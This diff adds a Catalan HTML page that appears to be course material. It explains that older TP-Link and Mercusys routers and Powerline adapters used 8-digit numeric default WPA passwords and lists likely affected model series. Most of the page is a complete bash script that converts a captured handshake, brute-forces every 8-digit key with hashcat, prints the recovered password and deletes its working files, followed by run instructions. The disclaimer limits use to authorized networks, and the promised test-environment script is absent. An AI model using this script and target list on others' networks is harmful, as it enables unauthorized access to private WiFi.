@@ -1,0 +1,201 @@
+<!DOCTYPE html>
+<html lang="ca">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Manual — TP‑Link/Mercusys</title>
+    <style>
+      :root {
+        --bg-1: #0b1220;
+        --bg-2: #12263a;
+        --accent: #00e5a8;
+        --accent-2: #5ab0ff;
+        --text: #e6eef6;
+        --muted: #c8d6e5;
+        --card: rgba(16, 34, 54, 0.65);
+        --border: rgba(255, 255, 255, 0.08);
+      }
+
+      body { margin: 0; color: var(--text); font-family: Inter, sans-serif;
+        background: radial-gradient(at 10% 10%, rgba(90,176,255,0.25), transparent 60%), linear-gradient(135deg, #0b1220 0%, #12263a 100%);
+        min-height: 100vh; line-height: 1.6; }
+      
+      header { position: sticky; top: 0; backdrop-filter: blur(6px); background: rgba(10, 20, 32, 0.6); border-bottom: 1px solid var(--border); padding:12px 18px; display: flex; align-items: center; justify-content: space-between; z-index: 1000; }
+      .brand { font-weight:700; color: #fff; }
+      .btn-back { color: var(--accent); text-decoration: none; border: 1px solid var(--accent); padding: 5px 10px; border-radius: 5px; font-size: 0.9rem; }
+      .btn-back:hover { background: var(--accent); color: #000; }
+
+      main { max-width: 900px; margin: 24px auto; padding: 0 16px 64px; }
+      .card { background: var(--card); border: 1px solid var(--border); border-radius: 14px; padding: 30px; margin-bottom: 30px; }
+      
+      h1 { color: var(--accent); margin-top: 0; font-size: 1.8rem; }
+      h2 { color: var(--accent-2); border-bottom: 1px solid var(--border); padding-bottom: 5px; margin-top: 30px; font-size: 1.4rem; }
+      h3 { color: #fff; margin-top: 20px; font-size: 1.1rem; }
+      p, li { color: var(--muted); margin-bottom: 10px; }
+      strong { color: #fff; }
+      
+      .warning-box { background: rgba(239, 68, 68, 0.1); border-left: 4px solid #ef4444; padding: 15px; margin-bottom: 30px; border-radius: 0 8px 8px 0; }
+      .code-block { background: rgba(0,0,0,0.3); border: 1px solid var(--border); padding: 15px; border-radius: 8px; overflow-x: auto; font-family: monospace; font-size: 0.9rem; color: #e2e8f0; }
+      .cmd { color: var(--accent-3); }
+    </style>
+  </head>
+  <body>
+    <header>
+      <div class="brand">Manual Configuració Segura</div>
+      <a href="xarxes.html" class="btn-back">← Tornar als Exercicis</a>
+    </header>
+
+    <main>
+      
+      <!-- AVÍS LEGAL -->
+      <section class="warning-box">
+        <strong>⚠️ Descàrrec de Responsabilitat:</strong>
+        <p style="margin:5px 0 0 0; font-size:0.95rem;">
+          Aquest manual té finalitats exclusivament educatives i de conscienciació sobre seguretat. La prova de seguretat en xarxes o dispositius sense autorització és il·legal i poc ètica. Utilitza les eines i scripts aquí descrits únicament en les teves pròpies xarxes i dispositius, o en aquells per als quals tinguis permís explícit. La informació sobre contrasenyes per defecte és històrica i pot no aplicar-se a dispositius o versions de firmware recents. Sempre verifica la contrasenya a l'etiqueta del dispositiu.
+        </p>
+      </section>
+
+      <section class="card">
+        <h1>Manual de Configuració i Prova de Seguretat Bàsica per a Dispositius WiFi TP-Link i Mercusys</h1>
+        <p>Aquest manual aborda la configuració de dispositius WiFi de TP-Link i Mercusys que històricament han utilitzat patrons de contrasenya WPA per defecte de 8 dígits numèrics, explica com funciona un script de força bruta per a aquest tipus de contrasenyes i proporciona un script per crear un entorn de prova.</p>
+
+        <h2>Part 1: Dispositius TP-Link i Mercusys amb Contrasenyes Numèriques</h2>
+        <p>Històricament, alguns models de routers i, en particular, d'adaptadors Powerline (PLC) amb funcionalitat WiFi de TP-Link i la seva marca germana Mercusys han utilitzat un patró de contrasenya WPA/WPA2 per defecte basat únicament en <strong>8 dígits numèrics (0-9)</strong>. Aquesta pràctica ha disminuït en models més recents, que tendeixen a utilitzar contrasenyes més llargues i aleatòries impreses a l'etiqueta.</p>
+
+        <h3>Factors a Considerar:</h3>
+        <ul>
+            <li><strong>Models Antics:</strong> Aquest patró era més comú en dispositius fabricats fa diversos anys.</li>
+            <li><strong>Powerline (PLC) amb WiFi:</strong> És més probable trobar aquest patró en els adaptadors PLC que estenen la xarxa WiFi.</li>
+            <li><strong>Routers de Gamma Baixa/Antics:</strong> Alguns models bàsics o antics de routers podrien haver utilitzat aquest patró.</li>
+            <li><strong>Firmware:</strong> Una actualització de firmware podria canviar el patró de contrasenya per defecte o forçar una contrasenya diferent.</li>
+            <li><strong>Regió:</strong> Les configuracions per defecte poden variar segons la regió de venda.</li>
+        </ul>
+
+        <h3>Recopilació (Basada en patrons històrics):</h3>
+        <p>És difícil proporcionar una llista exacta, però alguns dispositius que podrien haver utilitzat aquest esquema inclouen certes revisions de:</p>
+        <ul>
+            <li><strong>Adaptadors Powerline WiFi TP-Link:</strong> Sèries TL-WPAXXXX (ex. TL-WPA4220, TL-WPA8630) en versions de hardware i firmware més antigues.</li>
+            <li><strong>Routers TP-Link:</strong> Alguns models bàsics de la sèrie TL-WRXXXX o models antics de la sèrie Archer.</li>
+            <li><strong>Adaptadors Powerline WiFi Mercusys:</strong> Models de la sèrie MPXXXX (ex. MP500 Kit amb WiFi).</li>
+            <li><strong>Routers Mercusys:</strong> Models MWXXXX (ex. MW300, MW305R) en revisions antigues.</li>
+        </ul>
+
+        <div class="warning-box" style="border-left-color:var(--accent); background:rgba(0,229,168,0.1);">
+            <strong>Verificació Crucial:</strong> La única manera fiable de saber la contrasenya per defecte és mirar l'etiqueta física del dispositiu. La vulnerabilitat resideix en què un espai de claus de només 8 dígits numèrics (100.000.000 combinacions) es pot trencar per força bruta en molt poc temps.
+        </div>
+
+        <h2>Part 2: Script Bash per a Força Bruta (8 Dígits)</h2>
+        <p>Aquest script de Bash utilitza les eines <code>hcxpcapngtool</code> i <code>hashcat</code> per intentar crackejar contrasenyes WPA/WPA2 que consisteixen únicament en 8 dígits numèrics.</p>
+
+        <h3>Prerequisits:</h3>
+        <ul>
+            <li>Tener instal·lats <code>hcxpcapngtool</code> i <code>hashcat</code> (Linux, macOS, Kali).</li>
+            <li>Tener un fitxer de captura (<strong>.cap</strong> o <strong>.pcapng</strong>) amb un handshake valid.</li>
+        </ul>
+
+        <h3>El Script Bash:</h3>
+        <p>Pots guardar aquest codi com a <code>crack_wpa_8digit.sh</code>.</p>
+        
+        <pre class="code-block">#!/bin/bash
+
+# =========================
+# CONFIGURACIÓ
+# =========================
+LOGFILE="wpa_crack_$(date +%F_%H-%M-%S).log"
+CLEANUP=true  # Canvia a false si no vols esborrar els fitxers temporals
+
+# =========================
+# FUNCIONS
+# =========================
+
+function log() {
+    echo -e "$1" | tee -a "$LOGFILE"
+}
+
+# =========================
+# INICI DEL SCRIPT
+# =========================
+
+log "[*] Iniciant script de cracking WPA (8 dígits numèrics)."
+log "[*] Fitxer de log: $LOGFILE"
+
+# 1. Verificar argument
+if [ -z "$1" ]; then
+    log "[!] Ús: $0 fitxer.cap"
+    log "[!] Es requereix un fitxer de captura WPA (.cap o .pcapng)."
+    exit 1
+fi
+
+CAPFILE="$1"
+if [[ ! "$CAPFILE" =~ \.(cap|pcapng)$ ]]; then
+    log "[!] Error: El fitxer '$CAPFILE' no sembla ser un fitxer .cap o .pcapng."
+    exit 1
+fi
+
+if [ ! -f "$CAPFILE" ]; then
+    log "[!] Error: El fitxer '$CAPFILE' no existeix."
+    exit 1
+fi
+
+BASENAME=$(basename "$CAPFILE")
+BASENAME="${BASENAME%.cap}"
+BASENAME="${BASENAME%.pcapng}"
+
+HC22000FILE="${BASENAME}.hc22000"
+
+# 2. Convertir .cap a .hc22000
+log "[*] Convertint $CAPFILE a $HC22000FILE (mode 22000 per Hashcat)..."
+if ! command -v hcxpcapngtool &> /dev/null; then
+    log "[!] Error: hcxpcapngtool no trobat. Si us plau, instal·la'l."
+    exit 1
+fi
+hcxpcapngtool -o "$HC22000FILE" "$CAPFILE" >> "$LOGFILE" 2>&1
+
+if [ ! -f "$HC22000FILE" ]; then
+    log "[!] Error: No s'ha pogut generar el fitxer .hc22000"
+    exit 1
+fi
+log "[*] Fitxer .hc22000 generat amb èxit."
+
+# 3. Executar Hashcat amb màscara numèrica
+log "[*] Iniciant atac amb Hashcat (mode 22000, 8 dígits numèrics)..."
+if ! command -v hashcat &> /dev/null; then
+    log "[!] Error: hashcat no trobat."
+    exit 1
+fi
+
+# Executar hashcat
+hashcat -m 22000 -a 3 "$HC22000FILE" ?d?d?d?d?d?d?d?d --status --status-timer=10 --force >> "$LOGFILE" 2>&1
+
+# 4. Mostrar resultat
+log "[*] Verificant si s'ha trobat la contrasenya..."
+FOUND=$(hashcat -m 22000 "$HC22000FILE" --show 2>/dev/null)
+
+if [ -n "$FOUND" ]; then
+    log "\n[+] ¡¡¡CONTRASENYA TROBADA!!!"
+    PASSWORD=$(echo "$FOUND" | awk -F: '{print $NF}')
+    log "[+] Xarxa / Password: $FOUND"
+    log "[+] Password extreta: $PASSWORD"
+else
+    log "[!] Contrasenya no trobada després de provar totes les combinacions."
+fi
+
+# 5. Neteja
+if [ "$CLEANUP" = true ]; then
+    rm -f "$HC22000FILE" hashcat.potfile hashcat.restore >> "$LOGFILE" 2>&1
+    log "[*] Neteja completada."
+fi
+
+log "[*] Procés finalitzat."
+exit 0</pre>
+
+        <h3>Com utilitzar-lo:</h3>
+        <ol>
+            <li>Guarda el codi en un fitxer: <code>nano crack_wpa.sh</code></li>
+            <li>Dona permisos d'execució: <code>chmod +x crack_wpa.sh</code></li>
+            <li>Executa'l amb la teva captura: <code>./crack_wpa.sh captura.cap</code></li>
+        </ol>
+      </section>
+    </main>
+  </body>
+</html>
